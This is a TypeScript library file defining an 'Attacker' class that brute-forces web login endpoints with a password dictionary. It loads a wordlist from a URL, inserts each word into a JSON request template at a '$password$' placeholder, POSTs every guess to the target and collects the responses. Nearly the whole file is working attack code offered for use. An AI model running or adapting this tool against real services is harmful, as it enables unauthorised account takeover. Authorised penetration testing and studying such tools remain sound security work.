/**
 * @file The lib.ts file is the main library. It contains the Attacker class and two utility functions.
 */

/**
 * hasValue() take an object and a target and return true if the object contains the target.
 * @param {object} obj The object to serach value
 * @param {string} target The target
 * @returns {boolean}
 */
function hasValue(obj: Object, target: string): boolean {
  return JSON.stringify(obj).includes(target)
}

/**
 * replaceValue() take an object an replace a value with an other.
 * @param {object} obj The object whose values will be replaced
 * @param {string} target Target string
 * @param {string} value  Value
 * @returns {object}
 */
function replaceValue(obj: any, target: string, value: string): object {
  return JSON.parse(JSON.stringify(obj).replace(target, value))
}

/**
 * Main class
 * Usage: new Attacker('<url>')
 */
class Attacker {
  private dictionary: string[] = []
  private schema: Object = {}
  private fetchOptions: RequestInit

  /**
   * @param {string} url The url to attack
   * @param {RequestInit} fetchOptions Options to pass to fetch()
   */
  constructor(private url: string, fetchOptions?: RequestInit) {
    this.fetchOptions = {
      method: 'POST',
      ...fetchOptions,
    }
  }

  /**
   * Method to load a dictonary.
   * @param {string} url The url where the dictionary is.
   * @param {RequestInit} fetchOptions Options to pass to fetch()
   */
  async loadDictionary(url: string, fetchOptions?: RequestInit) {
    const res = await fetch(url, fetchOptions)
    const rawDic = await res.text()
    this.dictionary = rawDic.split('\n')
  }

  /**
   * Method to define a schema.
   * @param {string} schema
   */
  async defineSchema(strSchema: string) {
    const schema = JSON.parse(strSchema)
    let isValid = hasValue(schema, '$password$')
    if (!isValid) {
      throw new Error("The schema don't have a $password$ field.")
    }
    this.schema = schema
  }

  /**
   * Launch the attack
   * @param {string | undefined} type Type of the request e.g. 'json'
   * @returns {Array<object>}
   */
  async launchAttack(type?: string): Promise<object[]> {
    if (this.schema === {}) {
      throw new Error('No schema defined.')
    } else if (this.dictionary.length === 0) {
      throw new Error('No words in dictionary.')
    }

    let result: any[] = []
    for (const word of this.dictionary) {
      try {
        JSON.parse(JSON.stringify(this.schema))
      } catch (error) {
        console.log('err in attack')
      }
      let schema = replaceValue(this.schema, '$password$', word)
      const res = await fetch(this.url, {
        ...this.fetchOptions,
        body: JSON.stringify(schema),
      })
      if (res.headers.get('content-type') === 'application/json') {
        result.push(JSON.stringify(await res.json(), null, 2))
      } else {
        result.push(await res.text())
      }
    }
    return result
  }
}
